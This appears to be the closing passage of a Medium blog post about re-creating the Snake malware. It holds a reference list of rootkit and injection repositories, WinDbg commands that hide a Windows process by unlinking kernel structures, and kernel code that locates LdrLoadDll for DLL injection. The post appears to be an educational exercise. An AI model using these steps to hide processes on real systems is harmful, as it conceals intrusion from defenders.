class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://dennisbabkin.com/blog/?i=AAA10800</a></li><li name="e782" id="e782" class="graf graf--li graf-after--li"><strong class="markup--strong markup--li-strong">[012]</strong> <a href="https://github.com/suvllian/process-inject/blob/master/Src/APCInject%28Ring0%29.c" data-href="https://github.com/suvllian/process-inject/blob/master/Src/APCInject(Ring0).c" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://github.com/suvllian/process-inject/blob/master/Src/APCInject(Ring0).c</a> — another example of KAPC injection</li><li name="3bef" id="3bef" class="graf graf--li graf-after--li"><strong class="markup--strong markup--li-strong">[013]</strong> <a href="https://github.com/daem0nc0re/VectorKernel/tree/main/InjectLibrary" data-href="https://github.com/daem0nc0re/VectorKernel/tree/main/InjectLibrary" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://github.com/daem0nc0re/VectorKernel/tree/main/InjectLibrary</a> — another example of KAPC injection</li><li name="469a" id="469a" class="graf graf--li graf-after--li"><strong class="markup--strong markup--li-strong">[014] Windows API hooking. Simple C++ example.:</strong> <a href="https://cocomelonc.github.io/tutorial/2021/11/30/basic-hooking-1.html" data-href="https://cocomelonc.github.io/tutorial/2021/11/30/basic-hooking-1.html" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://cocomelonc.github.io/tutorial/2021/11/30/basic-hooking-1.html</a> — simple well explained showcase of Windows API hooking for message box</li><li name="c20a" id="c20a" class="graf graf--li graf-after--li"><strong class="markup--strong markup--li-strong">[015] Windows API Hooking:</strong> <a href="https://www.ired.team/offensive-security/code-injection-process-injection/how-to-hook-windows-api-using-c++" data-href="https://www.ired.team/offensive-security/code-injection-process-injection/how-to-hook-windows-api-using-c++" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://www.ired.team/offensive-security/code-injection-process-injection/how-to-hook-windows-api-using-c++</a> — simple well-explained showcase of Windows API hooking for messagebox</li><li name="558b" id="558b" class="graf graf--li graf-after--li"><strong class="markup--strong markup--li-strong">[016]</strong> <a href="https://www.youtube.com/watch?v=uS22dBJpr7U" data-href="https://www.youtube.com/watch?v=uS22dBJpr7U" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://www.youtube.com/watch?v=uS22dBJpr7U</a></li><li name="bef6" id="bef6" class="graf graf--li graf-after--li"><strong class="markup--strong markup--li-strong">[017] </strong>ProcessHider: <a href="https://github.com/kernelm0de/ProcessHider" data-href="https://github.com/kernelm0de/ProcessHider" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://github.com/kernelm0de/ProcessHider</a> — github example of process hiding using dll injection</li><li name="afdf" id="afdf" class="graf graf--li graf-after--li"><strong class="markup--strong markup--li-strong">[018]</strong> <a href="https://github.com/microsoft/Detours" data-href="https://github.com/microsoft/Detours" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://github.com/microsoft/Detours</a> — library for function hooking</li><li name="eaa7" id="eaa7" class="graf graf--li graf-after--li"><strong class="markup--strong markup--li-strong">[019]</strong> <a href="https://github.com/TsudaKageyu/minhook" data-href="https://github.com/TsudaKageyu/minhook" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://github.com/TsudaKageyu/minhook</a> — library for function hooking</li><li name="256a" id="256a" class="graf graf--li graf-after--li"><strong class="markup--strong markup--li-strong">[020]</strong> <a href="https://gist.github.com/TheWover/799822ce3d1239e0bd5764ac0b0adfda" data-href="https://gist.github.com/TheWover/799822ce3d1239e0bd5764ac0b0adfda" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://gist.github.com/TheWover/799822ce3d1239e0bd5764ac0b0adfda</a> — Call setup for NtQuerySystemInformation</li><li name="ac2a" id="ac2a" class="graf graf--li graf-after--li"><strong class="markup--strong markup--li-strong">[021]</strong> <a href="http://www.rohitab.com/discuss/topic/40323-hide-process-with-ntquerysysteminformation-hook/" data-href="http://www.rohitab.com/discuss/topic/40323-hide-process-with-ntquerysysteminformation-hook/" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">http://www.rohitab.com/discuss/topic/40323-hide-process-with-ntquerysysteminformation-hook/</a> — example of hiding process using function hooking</li><li name="0c33" id="0c33" class="graf graf--li graf-after--li"><strong class="markup--strong markup--li-strong">[022] Detecting Process Injection using Microsoft Detour Hooks:</strong> <a href="https://blog.securehat.co.uk/process-injection/detecting-process-injection-using-microsoft-detour-hooks" data-href="https://blog.securehat.co.uk/process-injection/detecting-process-injection-using-microsoft-detour-hooks" class="markup--anchor markup--li-anchor" rel="nofollow noopener" target="_blank">https://blog.securehat.co.uk/process-injection/detecting-process-injection-using-microsoft-detour-hooks</a> — example of how to setup SM detorus</li><li name="bd1f" id="bd1f" class="graf graf--li graf-after--li"><strong class="markup--strong markup--li-strong">[xxx] Hide Processes in Task Manager:</strong> <a href="https://medium.com/@s12deff/hide-processes-in-task-manager-64043c7c2c4b" data-href="https://medium.com/@s12deff/hide-processes-in-task-manager-64043c7c2c4b" class="markup--anchor markup--li-anchor" rel="nofollow" target="_blank">https://medium.com/@s12deff/hide-processes-in-task-manager-64043c7c2c4b</a> — Dll used for hiding process in task manager, needed some modification to work in kernel</li></ul><h3 name="1346" id="1346" class="graf graf--h3 graf-after--li">Appendix A: Process Hiding via Unlinking (DKOM) — FAILED</h3><p name="8666" id="8666" class="graf graf--p graf-after--h3">Starting off I tried to just copy and paste some code from other rootkits to achieve the process of unlinking, but I was not able to get anything working… it&#39;s almost like doing script kiddie stuff and just randomly stealing without understanding the fundamental concepts of what we are trying to do is like shooting yourself in the foot… interesting.</p><p name="f18a" id="f18a" class="graf graf--p graf-after--p">So instead let&#39;s follow this article by ired on how we can do this manually, we do this with the goal of completely understanding the fundamentals.</p><p name="0bf3" id="0bf3" class="graf graf--p graf-after--p"><a href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/manipulating-activeprocesslinks-to-unlink-processes-in-userland" data-href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/manipulating-activeprocesslinks-to-unlink-processes-in-userland" class="markup--anchor markup--p-anchor" rel="nofollow noopener" target="_blank">https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/manipulating-activeprocesslinks-to-unlink-processes-in-userland</a></p><p name="eb4b" id="eb4b" class="graf graf--p graf-after--p">Originally I was not able to get it working, then after messing around a bit I found that some of the offsets used in the article were not valid for an updated reference on the offsets in question please refer to this page:</p><div name="ee04" id="ee04" class="graf graf--mixtapeEmbed graf-after--p"><a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ps/eprocess/index.htm" data-href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ps/eprocess/index.htm" class="markup--anchor markup--mixtapeEmbed-anchor" title="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ps/eprocess/index.htm"><strong class="markup--strong markup--mixtapeEmbed-strong">EPROCESS</strong><br><em class="markup--em markup--mixtapeEmbed-em">Many functions that are exported from the kernel, e.g., for use by drivers, provide for referring to a process object…</em>www.geoffchappell.com</a><a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ps/eprocess/index.htm" class="js-mixtapeImage mixtapeImage mixtapeImage--empty u-ignoreBlock" data-media-id="f46cddc3d35b54c5e2cc37ed80c9817a"></a></div><p name="708e" id="708e" class="graf graf--p graf-after--mixtapeEmbed">And in the end, we get a working example:</p><figure name="ea6c" id="ea6c" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*LgF8EeYdjQ7joOMTJ-FCaA.png" data-width="672" data-height="379" src="https://cdn-images-1.medium.com/max/800/1*LgF8EeYdjQ7joOMTJ-FCaA.png"><figcaption class="imageCaption">Unlinked process</figcaption></figure><p name="fa97" id="fa97" class="graf graf--p graf-after--figure">Here are the commands I used doing this</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="yaml" name="5324" id="5324" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-string">lkd&gt;</span> <span class="hljs-type">!process</span> <span class="hljs-number">1090 </span><span class="hljs-number">0</span><br /><span class="hljs-string">Searching</span> <span class="hljs-string">for</span> <span class="hljs-string">Process</span> <span class="hljs-string">with</span> <span class="hljs-string">Cid</span> <span class="hljs-string">==</span> <span class="hljs-number">1090</span><br /><span class="hljs-string">PROCESS</span> <span class="hljs-string">ffff8d0f4b605080</span><br />    <span class="hljs-attr">SessionId: 1  Cid: 1090    Peb: b2597ce000  ParentCid:</span> <span class="hljs-string">0b5c</span><br />    <span class="hljs-attr">DirBase: 1c8205002  ObjectTable: ffffe40df7cca240  HandleCount:</span> <span class="hljs-number">640</span><span class="hljs-string">.</span><br />    <span class="hljs-attr">Image:</span> <span class="hljs-string">Notepad.exe</span><br /><br /><span class="hljs-string">lkd&gt;</span> <span class="hljs-string">dq</span> <span class="hljs-string">ffff8d0f4b605080+448</span> <span class="hljs-string">L2</span><br /><span class="hljs-string">ffff8d0f`4b6054c8</span>  <span class="hljs-string">ffff8d0f`4a60e4c8</span> <span class="hljs-string">ffff8d0f`48384508</span><br /><br /><span class="hljs-string">lkd&gt;</span> <span class="hljs-string">da</span> <span class="hljs-string">ffff8d0f`4a60e4c8-2f0+450</span><br /><span class="hljs-string">ffff8d0f`4a60e628</span>  <span class="hljs-string">&quot;svchost.exe&quot;</span><br /><br /><span class="hljs-string">lkd&gt;</span> <span class="hljs-string">da</span> <span class="hljs-string">ffff8d0f`48384508-2f0+450</span><br /><span class="hljs-string">ffff8d0f`48384668</span>  <span class="hljs-string">&quot;RuntimeBroker.&quot;</span><br /><br /><span class="hljs-string">lkd&gt;</span> <span class="hljs-string">dd</span> <span class="hljs-string">ffff8d0f`4a60e4c8-2f0+2e8</span> <span class="hljs-string">L1</span><br /><span class="hljs-string">ffff8d0f`4a60e4c0</span>  <span class="hljs-number">00002088</span><br /><br /><span class="hljs-string">lkd&gt;</span> <span class="hljs-string">dd</span> <span class="hljs-string">ffff8d0f`48384508-2f0+2e8</span> <span class="hljs-string">L1</span><br /><span class="hljs-string">ffff8d0f`48384500</span>  <span class="hljs-string">00000b28</span><br /><br /><span class="hljs-string">lkd&gt;</span> <span class="hljs-type">!process</span> <span class="hljs-number">00002088</span> <span class="hljs-number">0</span><br /><span class="hljs-string">Searching</span> <span class="hljs-string">for</span> <span class="hljs-string">Process</span> <span class="hljs-string">with</span> <span class="hljs-string">Cid</span> <span class="hljs-string">==</span> <span class="hljs-number">2088</span><br /><span class="hljs-string">Unimplemented</span> <span class="hljs-string">error</span> <span class="hljs-string">for</span> <span class="hljs-string">PspMemoryReserveObjectTypes</span><br /><span class="hljs-string">Unimplemented</span> <span class="hljs-string">error</span> <span class="hljs-string">for</span> <span class="hljs-string">PspMemoryReserveObjectTypes</span><br /><span class="hljs-string">PROCESS</span> <span class="hljs-string">ffff8d0f4a60e080</span><br />    <span class="hljs-attr">SessionId: 0  Cid: 2088    Peb: 4e95cf8000  ParentCid:</span> <span class="hljs-string">030c</span><br />    <span class="hljs-attr">DirBase: 161392002  ObjectTable: ffffe40df8087480  HandleCount:</span> <span class="hljs-number">423</span><span class="hljs-string">.</span><br />    <span class="hljs-attr">Image:</span> <span class="hljs-string">svchost.exe</span><br /><br /><span class="hljs-string">lkd&gt;</span> <span class="hljs-type">!process</span> <span class="hljs-string">00000b28</span> <span class="hljs-number">0</span><br /><span class="hljs-string">Searching</span> <span class="hljs-string">for</span> <span class="hljs-string">Process</span> <span class="hljs-string">with</span> <span class="hljs-string">Cid</span> <span class="hljs-string">==</span> <span class="hljs-string">b28</span><br /><span class="hljs-string">Unimplemented</span> <span class="hljs-string">error</span> <span class="hljs-string">for</span> <span class="hljs-string">PspMemoryReserveObjectTypes</span><br /><span class="hljs-string">Unimplemented</span> <span class="hljs-string">error</span> <span class="hljs-string">for</span> <span class="hljs-string">PspMemoryReserveObjectTypes</span><br /><span class="hljs-string">PROCESS</span> <span class="hljs-string">ffff8d0f483840c0</span><br />    <span class="hljs-attr">SessionId: 1  Cid: 0b28    Peb: ba4fdee000  ParentCid:</span> <span class="hljs-number">0398</span><br />    <span class="hljs-attr">DirBase: 1625e8002  ObjectTable: ffffe40df7cce880  HandleCount:</span> <span class="hljs-number">146</span><span class="hljs-string">.</span><br />    <span class="hljs-attr">Image:</span> <span class="hljs-string">RuntimeBroker.exe</span><br /><br /><span class="hljs-string">link</span> <span class="hljs-string">runtimebroker</span><br /><span class="hljs-string">lkd&gt;</span> <span class="hljs-string">dq</span> <span class="hljs-string">ffff8d0f483840c0+448</span> <span class="hljs-string">L2</span><br /><span class="hljs-string">ffff8d0f`48384508</span>  <span class="hljs-string">ffff8d0f`4b6054c8</span> <span class="hljs-string">ffff8d0f`4838b4c8</span><br /><span class="hljs-string">lkd&gt;</span> <span class="hljs-string">dt</span> <span class="hljs-string">_eprocess</span> <span class="hljs-string">ffff8d0f483840c0</span><br /><span class="hljs-string">nt!_EPROCESS</span><br />   <span class="hljs-string">+0x000</span> <span class="hljs-attr">Pcb              :</span> <span class="hljs-string">_KPROCESS</span><br />   <span class="hljs-string">+0x438</span> <span class="hljs-attr">ProcessLock      :</span> <span class="hljs-string">_EX_PUSH_LOCK</span><br />   <span class="hljs-string">+0x440</span> <span class="hljs-attr">UniqueProcessId  :</span> <span class="hljs-number">0x00000000</span><span class="hljs-string">`00000b28</span> <span class="hljs-string">Void</span><br />   <span class="hljs-string">+0x448</span> <span class="hljs-attr">ActiveProcessLinks :</span> <span class="hljs-string">_LIST_ENTRY</span> [ <span class="hljs-number">0xffff8d0f</span><span class="hljs-string">`4b6054c8</span> <span class="hljs-bullet">-</span> <span class="hljs-number">0xffff8d0f</span><span class="hljs-string">`4838b4c8</span> ]<br /><br /><span class="hljs-string">links</span> <span class="hljs-string">svchost</span><br /><span class="hljs-string">lkd&gt;</span> <span class="hljs-string">dq</span> <span class="hljs-string">ffff8d0f4a60e080+448</span> <span class="hljs-string">L2</span><br /><span class="hljs-string">ffff8d0f`4a60e4c8</span>  <span class="hljs-string">ffff8d0f`473b8508</span> <span class="hljs-string">ffff8d0f`4b6054c8</span><br /><span class="hljs-string">lkd&gt;</span> <span class="hljs-string">dt</span> <span class="hljs-string">_eprocess</span> <span class="hljs-string">ffff8d0f4a60e080</span><br /><span class="hljs-string">nt!_EPROCESS</span><br />   <span class="hljs-string">+0x000</span> <span class="hljs-attr">Pcb              :</span> <span class="hljs-string">_KPROCESS</span><br />   <span class="hljs-string">+0x438</span> <span class="hljs-attr">ProcessLock      :</span> <span class="hljs-string">_EX_PUSH_LOCK</span><br />   <span class="hljs-string">+0x440</span> <span class="hljs-attr">UniqueProcessId  :</span> <span class="hljs-number">0x00000000</span><span class="hljs-string">`00002088</span> <span class="hljs-string">Void</span><br />   <span class="hljs-string">+0x448</span> <span class="hljs-attr">ActiveProcessLinks :</span> <span class="hljs-string">_LIST_ENTRY</span> [ <span class="hljs-number">0xffff8d0f</span><span class="hljs-string">`473b8508</span> <span class="hljs-bullet">-</span> <span class="hljs-number">0xffff8d0f</span><span class="hljs-string">`4b6054c8</span> ]<br /><br /><span class="hljs-string">unlink</span><br /><span class="hljs-string">lkd&gt;</span> <span class="hljs-string">eq</span> <span class="hljs-string">ffff8d0f`4a60e4c8</span> <span class="hljs-string">ffff8d0f`48384508</span><br /><span class="hljs-string">lkd&gt;</span> <span class="hljs-string">eq</span> <span class="hljs-string">ffff8d0f`48384508+8</span> <span class="hljs-string">ffff8d0f`4a60e4c8</span></span></pre><p name="8a5f" id="8a5f" class="graf graf--p graf-after--pre">At first, I found this very confusing, then I created the following diagram in an attempt to explain where the different values and commands in the article relate:</p></div><div class="section-inner sectionLayout--outsetColumn"><figure name="d59d" id="d59d" class="graf graf--figure graf--layoutOutsetCenter graf-after--p"><img class="graf-image" data-image-id="1*fxnC14o6bvTP8EnGaj0ecQ.png" data-width="3047" data-height="3003" src="https://cdn-images-1.medium.com/max/1200/1*fxnC14o6bvTP8EnGaj0ecQ.png"><figcaption class="imageCaption">Attempt at visualizing elements of ired article and how values are derived</figcaption></figure></div><div class="section-inner sectionLayout--insetColumn"><p name="e40d" id="e40d" class="graf graf--p graf-after--figure">Now let&#39;s try with as few commands as possible to get an idea of what we need our kernel driver to do</p><figure name="f9b3" id="f9b3" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*ZvmGnwmmOFbxiihT8nwg7A.png" data-width="634" data-height="528" src="https://cdn-images-1.medium.com/max/800/1*ZvmGnwmmOFbxiihT8nwg7A.png"><figcaption class="imageCaption">Shortest manual version using windbg</figcaption></figure><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="shell" name="5899" id="5899" class="graf graf--pre graf-after--figure graf--preV2"><span class="pre--content"><span class="hljs-meta prompt_">PS&gt; </span><span class="language-bash">ps notepad</span><br /><span class="hljs-meta prompt_">lkd&gt;</span><span class="language-bash">!process 23e4 0</span><br />ffff8885c5e900c0<br /><span class="hljs-meta prompt_">lkd&gt; </span><span class="language-bash">dq ffff8885c5e900c0+448 L2</span><br />ffff8885`c5e90508  ffff8885`c7f544c8 ffff8885`c7f534c8<br /><span class="hljs-meta prompt_">lkd&gt;</span><span class="language-bash">eq ffff8885`c7f544c8 ffff8885`c7f534c8</span><br /><span class="hljs-meta prompt_">lkd&gt;</span><span class="language-bash">eq ffff8885`c7f534c8+8 ffff8885`c7f544c8</span></span></pre><p name="508f" id="508f" class="graf graf--p graf-after--pre">So in short this is what we need our driver to do (we already have the PID since this is sent by the user using IOCTL):</p><ul class="postList"><li name="5d6b" id="5d6b" class="graf graf--li graf-after--p">Get the address of EPROCESS for the process to unlink</li><li name="ca3b" id="ca3b" class="graf graf--li graf-after--li">Retrieve and parse ActiveProcessLinks</li><li name="ceb3" id="ceb3" class="graf graf--li graf-after--li">Chang the next and previous links</li></ul><p name="0344" id="0344" class="graf graf--p graf-after--li">After doing this, our device crashes, a bit of research showed that it is likely to patch guard which is causing the BSOD. Doing some more research I found that Direct Kernel Object Manipulation (DKOM) has received quite some attention from Microsoft in recent years and is more or less considered a death sentence for the VM and process if we try to pull it off. more here: <a href="https://github.com/landhb/HideProcess/tree/master" data-href="https://github.com/landhb/HideProcess/tree/master" class="markup--anchor markup--p-anchor" rel="nofollow noopener" target="_blank">https://github.com/landhb/HideProcess/tree/master</a></p><p name="7a33" id="7a33" class="graf graf--p graf-after--p">Other rootkits which do the same (also won&#39;t be usable):</p><div name="ad35" id="ad35" class="graf graf--mixtapeEmbed graf-after--p"><a href="https://github.com/assarbad/Nidhogg" data-href="https://github.com/assarbad/Nidhogg" class="markup--anchor markup--mixtapeEmbed-anchor" title="https://github.com/assarbad/Nidhogg"><strong class="markup--strong markup--mixtapeEmbed-strong">GitHub — assarbad/Nidhogg: Nidhogg is an all-in-one simple to use rootkit for red teams.</strong><br><em class="markup--em markup--mixtapeEmbed-em">Nidhogg is an all-in-one simple to use rootkit for red teams. — GitHub — assarbad/Nidhogg: Nidhogg is an all-in-one…</em>github.com</a><a href="https://github.com/assarbad/Nidhogg" class="js-mixtapeImage mixtapeImage u-ignoreBlock" data-media-id="e8fdd17a6aba925a0da52eef710a48a4" data-thumbnail-img-id="0*x7oXjW_aaGPl2lie" style="background-image: url(https://cdn-images-1.medium.com/fit/c/160/160/0*x7oXjW_aaGPl2lie);"></a></div><div name="0cdb" id="0cdb" class="graf graf--mixtapeEmbed graf-after--mixtapeEmbed"><a href="https://github.com/XaFF-XaFF/Cronos-Rootkit" data-href="https://github.com/XaFF-XaFF/Cronos-Rootkit" class="markup--anchor markup--mixtapeEmbed-anchor" title="https://github.com/XaFF-XaFF/Cronos-Rootkit"><strong class="markup--strong markup--mixtapeEmbed-strong">GitHub — XaFF-XaFF/Cronos-Rootkit: Cronos is Windows 10/11 x64 ring 0 rootkit. Cronos is able to…</strong><br><em class="markup--em markup--mixtapeEmbed-em">Cronos is Windows 10/11 x64 ring 0 rootkit. Cronos is able to hide processes, protect and elevate them with token…</em>github.com</a><a href="https://github.com/XaFF-XaFF/Cronos-Rootkit" class="js-mixtapeImage mixtapeImage u-ignoreBlock" data-media-id="d3baa7e2214c6b2db7734b6df9b475ad" data-thumbnail-img-id="0*dOtUb8Pfq3BfX6J6" style="background-image: url(https://cdn-images-1.medium.com/fit/c/160/160/0*dOtUb8Pfq3BfX6J6);"></a></div><h3 name="7703" id="7703" class="graf graf--h3 graf-after--mixtapeEmbed">Appendix B: Get a pointer to ntdll!LdrLoadDll() — Using Static Offset</h3><p name="fb89" id="fb89" class="graf graf--p graf-after--h3">Get a pointer to ntdll!LdrLoadDll() — might be easier with a post-operation callback, because we need a pointer to ntdll</p><figure name="c388" id="c388" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*3a3Du6SKXoM8Gi-ZthFjDw.png" data-width="787" data-height="737" src="https://cdn-images-1.medium.com/max/800/1*3a3Du6SKXoM8Gi-ZthFjDw.png"><figcaption class="imageCaption">Finding static offset in CFF Explorer</figcaption></figure><p name="90a5" id="90a5" class="graf graf--p graf-after--figure">Function RVA: 0x00016a10</p><p name="1224" id="1224" class="graf graf--p graf-after--p">hypothesis: get the address of dll from the initial callback routine, then use the pe header to get the offset of ldrLoadDLL</p><p name="e204" id="e204" class="graf graf--p graf-after--p">How to do: Make a program in nim that shows that address using getProcAddress, then pauses execution, and have the kernel print the base address of the loaded dll or image; first try using nim and debugger together with the kernel module to see what info we can get out, then use this</p><p name="548f" id="548f" class="graf graf--p graf-after--p">The first step is to write a program we can use to print the values so that we can check our work. After a quick bit of nim magic, and a trip to the debugger we now have our values printed out.</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="python" name="d579" id="d579" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-comment"># Porpose of file is to print the locaiton of ntdll and then pause execution to allow debugging</span><br /><span class="hljs-keyword">import</span> winim<br /><span class="hljs-keyword">import</span> strutils</span></pre><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="php" name="2a68" id="2a68" class="graf graf--pre graf-after--pre graf--preV2"><span class="pre--content"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[+] Getting base of this image with GetModuleHandleA&quot;</span><br /><span class="hljs-keyword">var</span> hNtdll = <span class="hljs-title function_ invoke__">GetModuleHandleA</span>(<span class="hljs-string">&quot;ntdll.dll&quot;</span>)<br /><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ntdll.dll at 0x&quot;</span>, <span class="hljs-title function_ invoke__">toHex</span>(hNtdll)<br /><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[+] Using GetProcAddress to get location of LdrLoadDll&quot;</span><br /><span class="hljs-keyword">var</span> hLdrLoadDll = <span class="hljs-title function_ invoke__">GetProcAddress</span>(hNtdll, <span class="hljs-string">&quot;LdrLoadDll&quot;</span>)<br /><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;LdrLoadDll at 0x&quot;</span>, <span class="hljs-title function_ invoke__">toHex</span>(cast[<span class="hljs-keyword">int</span>](hLdrLoadDll))<br /><span class="hljs-comment"># Wait with termination</span><br /><span class="hljs-keyword">var</span> input = <span class="hljs-title function_ invoke__">readLine</span>(stdin)</span></pre></div><div class="section-inner sectionLayout--outsetColumn"><figure name="ea0d" id="ea0d" class="graf graf--figure graf--layoutOutsetCenter graf-after--pre"><img class="graf-image" data-image-id="1*y3kRzMFtucM1Ma8u19D_MA.png" data-width="1541" data-height="867" src="https://cdn-images-1.medium.com/max/1200/1*y3kRzMFtucM1Ma8u19D_MA.png"><figcaption class="imageCaption">Validating offset</figcaption></figure></div><div class="section-inner sectionLayout--insetColumn"><p name="57ba" id="57ba" class="graf graf--p graf-after--figure">Next, let&#39;s see if our math checks out, we add the RVA found in CFFExplorer to our base address and the result should equal the orange result outputted by our program.</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="bash" name="4510" id="4510" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">00007FFB0EAB0000 + 00016A10 = 7FFB0EAC6A10 <span class="hljs-comment"># 0x00007FFB0EAC6A10</span></span></pre><p name="859e" id="859e" class="graf graf--p graf-after--pre">Awesome, next up we expand the print statement in our kernel driver and then check that the pointer from the ImageInfo structure in the callback routine is the same as the one outputted in our program.</p><p name="c70f" id="c70f" class="graf graf--p graf-after--p">Kernel code:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="perl" name="ee8e" id="ee8e" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">PVOID hNtdll = imageInfo-&gt;ImageBase;<br /><span class="hljs-keyword">if</span> (!(hNtdll)) {<br />    KdPrint((<span class="hljs-string">&quot;Error in copying ntdll pointer\n&quot;</span>));<br />    <span class="hljs-keyword">return</span>;<br />}<br />KdPrint((<span class="hljs-string">&quot;pid %d, ntdll.dll, pointer: %p\n&quot;</span>, pid, hNtdll));</span></pre><figure name="5b8b" id="5b8b" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*oGu_s_LHsjVwWFDOsJ7Q-A.png" data-width="736" data-height="337" src="https://cdn-images-1.medium.com/max/800/1*oGu_s_LHsjVwWFDOsJ7Q-A.png"><figcaption class="imageCaption">Validating infor from kernel matches offset</figcaption></figure><p name="5af0" id="5af0" class="graf graf--p graf-after--figure">Awesome! now from here, we can calculate the address of ldrLoadDLL.</p><div name="f8c8" id="f8c8" class="graf graf--mixtapeEmbed graf-after--p"><a href="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FLdrLoadDll.html" data-href="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FLdrLoadDll.html" class="markup--anchor markup--mixtapeEmbed-anchor" title="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FLdrLoadDll.html"><strong class="markup--strong markup--mixtapeEmbed-strong">NTAPI Undocumented Functions</strong><br><em class="markup--em markup--mixtapeEmbed-em">Edit description</em>undocumented.ntinternals.net</a><a href="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FLdrLoadDll.html" class="js-mixtapeImage mixtapeImage mixtapeImage--empty u-ignoreBlock" data-media-id="59a1418c6858e26944da235982bb3fdc"></a></div><p name="b61d" id="b61d" class="graf graf--p graf-after--mixtapeEmbed">Note: Different Windows versions have different offsets:</p><figure name="d6c0" id="d6c0" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*DMcjoHvKOhYgk6P6pyYaTw.png" data-width="792" data-height="598" src="https://cdn-images-1.medium.com/max/800/1*DMcjoHvKOhYgk6P6pyYaTw.png"><figcaption class="imageCaption">Finding function offset</figcaption></figure><p name="3216" id="3216" class="graf graf--p graf-after--figure">Adjust the offset and we are now able to get the correct pointer to the library</p><figure name="27c9" id="27c9" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*ba3A_AgdENiTH_ovvPbYYg.png" data-width="525" data-height="235" src="https://cdn-images-1.medium.com/max/800/1*ba3A_AgdENiTH_ovvPbYYg.png"><figcaption class="imageCaption">Function offset validation</figcaption></figure><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="perl" name="6e3b" id="6e3b" class="graf graf--pre graf-after--figure graf--preV2"><span class="pre--content">PVOID hNtdll = imageInfo-&gt;ImageBase;<br />    <span class="hljs-keyword">if</span> (!(hNtdll)) {<br />        KdPrint((<span class="hljs-string">&quot;Error in copying ntdll pointer\n&quot;</span>));<br />        <span class="hljs-keyword">return</span>;<br />    }<br />    KdPrint((<span class="hljs-string">&quot;pid %d, ntdll.dll, pointer: %p\n&quot;</span>, pid, hNtdll));<br />    <span class="hljs-regexp">//</span> Pointer addition magic: https:<span class="hljs-regexp">//s</span>tackoverflow.com/questions/<span class="hljs-number">6449935</span>/increment-void-pointer-by-one-byte-by-two</span></pre><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="perl" name="b958" id="b958" class="graf graf--pre graf-after--pre graf--trailing graf--preV2"><span class="pre--content">PVOID ldrLoadDll = (*((CHAR**)(&amp;hNtdll))) + <span class="hljs-number">0x000226B0</span>;<br />KdPrint((<span class="hljs-string">&quot;pid %d, ldrLoadDll, pointer: %p\n&quot;</span>, pid, ldrLoadDll));</span></pre></div></div></section>
</section>
<footer><p>By <a href="https://medium.com/@0x0vid" class="p-author h-card">0x0vid</a> on <a href="https://medium.com/p/468d5783e6ba"><time class="dt-published" datetime="2024-02-09T11:31:07.228Z">February 9, 2024</time></a>.</p><p><a href="https://medium.com/@0x0vid/re-creating-the-snake-malware-part-004-kapc-injection-and-windows-api-hooking-to-hide-processes-468d5783e6ba" class="p-canonical">Canonical link</a></p><p>Exported from <a href="https://medium.com">Medium</a> on March 28, 2024.</p></footer></article></body></html>